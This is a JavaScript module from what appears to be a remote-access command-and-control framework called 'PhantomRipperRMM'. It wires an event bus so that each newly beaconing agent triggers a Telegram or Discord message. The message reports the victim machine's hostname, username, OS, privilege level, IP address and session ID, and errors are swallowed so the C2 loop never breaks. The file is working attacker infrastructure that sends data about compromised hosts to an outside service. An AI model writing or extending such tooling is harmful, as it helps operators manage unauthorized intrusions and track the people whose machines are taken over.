'use strict';

/**
 * PhantomRipperRMM — new-session notifications.
 * Fires a short message to Telegram and/or Discord when a fresh agent
 * beacons in. Both channels are optional and env-configured; failures are
 * swallowed (notifications must never break the C2 loop).
 *
 *   TELEGRAM_NOTIFY_TOKEN / TELEGRAM_NOTIFY_CHAT   — Telegram alerting
 *   DISCORD_NOTIFY_URL                             — Discord webhook URL
 *   NOTIFY_ALL_EVENTS=1                            — also alert on privilege changes
 */

const config = require('./config');

async function sendTelegram(text) {
  const { token, chatId } = config.notify.telegram;
  if (!token || !chatId) return;
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML', disable_web_page_preview: true }),
    });
  } catch (_) { /* never block */ }
}

async function sendDiscord(text) {
  const url = config.notify.discordUrl;
  if (!url) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: text }),
    });
  } catch (_) { /* never block */ }
}

function describe(info, ip) {
  const lines = [
    `<b>NEW PHANTOM SESSION</b>`,
    `host: <code>${escape(info.hostname || '?')}</code>`,
    `user: <code>${escape(info.username || '?')}</code>`,
    `os: <code>${escape(info.os || '?')}/${escape(info.arch || '?')}</code>`,
    `priv: <code>${escape(info.privilege || 'user')}</code>`,
    `ip: <code>${escape(ip || '?')}</code>`,
    `agent: <code>${escape(info.agent_type || 'python')}</code>`,
    `id: <code>${escape(info.id || '?')}</code>`,
  ];
  return lines.join('\n');
}

function escape(s) {
  return String(s ?? '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
}

function wire(bus) {
  bus.on('event', ({ type, payload }) => {
    if (type !== 'session_update' || !payload || !payload.isNew) return;
    const text = describe({ ...(payload.info || {}), id: payload.sessionId }, payload.info && payload.info.ip);
    sendTelegram(text);
    sendDiscord(text.replace(/<[^>]+>/g, ''));
  });
}

module.exports = { wire };
